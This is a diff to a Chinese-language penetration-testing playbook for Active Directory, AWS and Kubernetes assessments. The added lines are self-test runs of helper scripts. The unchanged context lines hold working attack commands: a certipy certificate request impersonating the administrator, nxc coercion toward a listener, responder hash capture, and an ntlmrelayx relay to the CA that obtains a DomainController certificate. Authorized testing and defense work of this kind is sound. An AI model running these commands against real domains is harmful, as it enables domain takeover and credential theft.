@@ -34,7 +34,7 @@
 ### 04 ADCS ESC1 模板验证（源：exploiting-active-directory-certificate-services-esc1）
 - 触发词：ESC1、SAN、certipy req、certipy auth、证书模板
 - 前置：`certipy find -vulnerable` 有输出；当前账号对目标模板有 Enroll；授权允许申请测试证书
-- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 9, "kinds": 7}`
   1) `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout` → rc=0｜期望输出：目标模板段 `ESC1 : True`、`Enroll` 含当前账号、`Manager Approval : False`。
   2) `certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"` → rc=0｜期望输出：`Saved certificate and private key to 'administrator.pfx'`；rc=1（`CERTSRV_E_*`/`denied by policy`）=ESC1 不成立，停。
   3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input find.json` → rc=0｜期望输出：`"verdict": "candidate"`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
@@ -46,7 +46,7 @@
 ### 05 强制认证（PetitPotam/Coercer）前提核查（源：coercing-authentication-with-coercer-petitpotam）
 - 触发词：PetitPotam、Coercer、强制认证、MS-EFSRPC、relay
 - 前置：明确授权强制认证目标；有可用 relay/监听端；确认不会影响生产
-- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 9, "kinds": 7}`
   1) `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<LISTENER_IP>` → rc=0｜期望输出：`Coerce+ ... EFSRPC/DFSCoerce` 命中；`STATUS_ACCESS_DENIED`=接口已补，停。
   2) `sudo responder -I eth0 -A`（或专用监听端）→ rc=0｜期望输出：`[SMB] NTLMv2-SSP Client : <target_ip>`，记时间与来源。
   3) `impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'` → rc=0｜期望输出：`GOT CERTIFICATE!` + `Writing PKCS#12 certificate`。
@@ -106,7 +106,7 @@
 ### 12 AWS 提权评估的身份与策略面（源：performing-aws-privilege-escalation-assessment）
 - 触发词：AWS、IAM、提权、CreatePolicyVersion、PassRole、sts
 - 前置：有授权账号/凭据；只读优先；写操作单独授权并备份
-- 步骤：1) `aws sts get-caller-identity` 确认身份；2) `list-attached-user-policies`/`list-user-policies`/`get-policy-version` 读策略；3) 用 `cloud-iam-eval.py` 对目标 action/resource 复算，再决定是否做只读验证
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action iam:CreatePolicyVersion --resource '*'` → rc=0，期望：`"decision": "allow"` 且 privesc 含 `"severity": "critical"`；2) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x'` → rc=0，期望：`"decision": "deny"` 且 deny_statements 非空；3) `python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0，期望：`"ok": true`
 - 判据：身份有效、策略文本允许目标动作、boundary/SCP 不拦、实际只读 API 成功；写操作需额外授权
 - 失败判据：AccessDenied/ExpiredToken、显式 Deny/boundary 拦截、文本 allow 但 API 拒绝 → 提权 blocked，记录未建模项
 - reference：Tool/skill/ad-cloud/references/cloud-native.md
@@ -162,7 +162,7 @@
 ### 19 Kubernetes 渗透测试的只读起步（源：performing-kubernetes-penetration-testing）
 - 触发词：Kubernetes、kubeconfig、API server、渗透测试、namespace
 - 前置：有 kubeconfig/SA token；授权允许只读 API；不创建资源
-- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+- 步骤：1) `python Tool/scripts/adcloud-check.py --kubeconfig Tool/cases/ad-cloud01/input/kubeconfig.yaml --json` → rc=0，期望：`"ok": true`、`"current_context": "lab-context-01"`、`"insecure_skip_tls_verify": true`；2) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`{"ok": true, "checks": 2}`；3) `python Tool/scripts/adcloud-check.py --help` → rc=0，期望：usage 含 `--kubeconfig`/`--aws-creds`
   1) `python Tool/scripts/adcloud-check.py --kubeconfig input/kubeconfig.yaml --json > artifacts/run.json` → rc=0｜期望输出：`"ok": true` + findings（如 `K8S-TRANSPORT-002`、`K8S-RBAC-00x`）。
   2) `kubectl config current-context` → rc=0｜期望输出：单个 context 名；rc=1 = kubeconfig 不可用，停。
   3) `kubectl auth can-i --list` → rc=0｜期望输出：`Resources`/`Verbs` 表（≥ 1 行）；`Forbidden` 或空表 = 身份无效，转 Secret/CI。
@@ -173,7 +173,7 @@
 ### 20 K8s RBAC 提权审计（源：auditing-kubernetes-rbac-privilege-escalation）
 - 触发词：RBAC、ClusterRole、RoleBinding、wildcard、escalate、bind
 - 前置：有只读 RBAC 权限；授权允许读 role/clusterrole/binding
-- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+- 步骤：1) `python Tool/skill/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 7`；3) `python Tool/scripts/adcloud-check.py --self-test` → rc=0，期望：`"ok": true`
   1) `kubectl get clusterrolebinding,rolebinding -A -o json > rbac.json` → rc=0｜期望输出：`items` ≥ 1 且 subject 含当前 SA/用户；空 `items` = 无可审面。
   2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input rbac-eval.json` → rc=0｜期望输出：`"verdict"` ∈ {candidate, confirmed} 且 `checks[].ok` 与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
   3) `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` → rc=0｜期望输出：`yes` 才算路径成立；`no` = blocked，转 Secret/CI。
